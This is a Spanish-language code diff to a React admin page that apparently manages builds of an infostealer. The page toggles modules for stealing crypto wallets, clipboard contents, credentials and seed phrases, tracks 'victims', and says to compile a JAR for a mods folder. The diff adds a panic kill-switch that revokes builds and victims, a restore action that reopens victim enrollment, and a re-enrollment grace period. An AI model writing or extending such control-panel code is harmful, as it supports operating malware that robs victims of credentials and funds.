@@ -17,11 +17,12 @@ import type { Build } from '@/lib/types';
 
 export default function BuildsPage() {
   const { data, loading, refresh, error } = useApi<{ items: Build[] }>('/builds', { pollMs: 15_000 });
+  const versions = useApi<{ release: string | null }>('/versions', { pollMs: 60_000 });
   const [open, setOpen] = useState(false);
   const [busy, setBusy] = useState('');
   const [reassignFor, setReassignFor] = useState<Build | null>(null);
   const [reassignTarget, setReassignTarget] = useState('');
-  const [form, setForm] = useState({ name: '', version: '1.0.0', profile: 'full', modules: { wallets: true, clipboard: true, credentials: true, seeds: true }, crack: true });
+  const [form, setForm] = useState({ name: '', version: '1.0.0', profile: 'full', modules: { wallets: true, clipboard: true, credentials: true, seeds: true }, crack: true, enroll_grace_hours: 24 });
   const role = useRole();
 
   async function create(event: React.FormEvent) {
@@ -87,6 +88,29 @@ export default function BuildsPage() {
     }
   }
 
+  async function panic() {
+    try {
+      const preview = await mutate<{ builds: number; victims: number }>('/panic?dry_run=1', 'POST');
+      if (!confirm(`Pánico: ${preview.builds} build(s) y ${preview.victims} víctima(s) quedarán revocados.\n\nLa cola local se conserva, pero cada víctima deberá volver a enrolar tras restaurar.`)) return;
+      await mutate('/panic', 'POST');
+      toast.success('Pánico aplicado');
+      refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'panic failed');
+    }
+  }
+
+  async function restore() {
+    if (!confirm('Restaurar solo reabre el enrolamiento: las víctimas revocadas siguen revocadas hasta que vuelvan a enrolar. ¿Continuar?')) return;
+    try {
+      await mutate('/panic/restore', 'POST');
+      toast.success('Enrolamiento reabierto; las víctimas deben re-enrolar');
+      refresh();
+    } catch (caught) {
+      toast.error(caught instanceof Error ? caught.message : 'restore failed');
+    }
+  }
+
   async function reassign(event: React.FormEvent) {
     event.preventDefault();
     if (!reassignFor || !reassignTarget) return;
@@ -110,7 +134,13 @@ export default function BuildsPage() {
         <Card>
           <CardHeader>
             <CardTitle>Catálogo de builds</CardTitle>
-            {role === 'admin' ? <Button size="sm" onClick={() => setOpen(true)}><Plus className="h-3 w-3" /> nuevo build</Button> : null}
+            <div className="flex gap-2">
+              {role === 'admin' ? <>
+                <Button size="sm" variant="secondary" onClick={panic}>pánico</Button>
+                <Button size="sm" variant="ghost" onClick={restore}>restaurar</Button>
+                <Button size="sm" onClick={() => { setForm((current) => ({ ...current, version: versions.data?.release ?? current.version })); setOpen(true); }}><Plus className="h-3 w-3" /> nuevo build</Button>
+              </> : null}
+            </div>
           </CardHeader>
           {error ? <p className="p-3 text-xs text-bad">{error.message}</p> : loading ? <SkeletonRows rows={6} cols={6} /> : (data?.items ?? []).length === 0 ? <Empty title="Sin builds" hint="Crea un build, compila el JAR y déjalo en mods/." /> : (
             <Table>
@@ -169,6 +199,7 @@ export default function BuildsPage() {
                   </label>
                 </div>
               </fieldset>
+              <div><Label>Gracia de re-enrolamiento (h, 0 = desactivada)</Label><Input type="number" min={0} max={168} value={form.enroll_grace_hours} onChange={(event) => setForm({ ...form, enroll_grace_hours: Number(event.target.value) })} /></div>
               <p className="text-2xs text-muted">Se generan 32 bytes de secreto y un build_id. El token deriva del secreto; guarda ambos. El perfil lite fuerza seeds, credenciales y crack a off.</p>
               <div className="flex justify-end"><Button type="submit" loading={busy === 'create'}>Crear</Button></div>
             </form>
